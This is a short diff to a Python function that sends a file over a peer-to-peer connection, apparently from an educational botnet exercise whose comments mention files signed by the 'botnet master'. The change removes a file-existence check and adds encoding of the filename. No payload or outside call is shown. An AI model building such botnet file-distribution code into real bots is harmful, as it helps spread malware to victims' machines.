@@ -184,11 +184,9 @@ def p2p_upload_file(sconn, fn):
     # You don't need to encrypt it only files signed
     # by the botnet master should be accepted
     # (and your bot shouldn't be able to sign like that!)
-    if fn not in filestore:
-        print("That file doesn't exist in the botnet's filestore")
-        return
-    print("Sending %s via P2P" % fn)
+    fn = bytes(fn, 'ascii')
     sconn.send(fn)
+    fn = fn.decode('ascii')
     sconn.send(filestore[fn])
 
 def run_file(f):
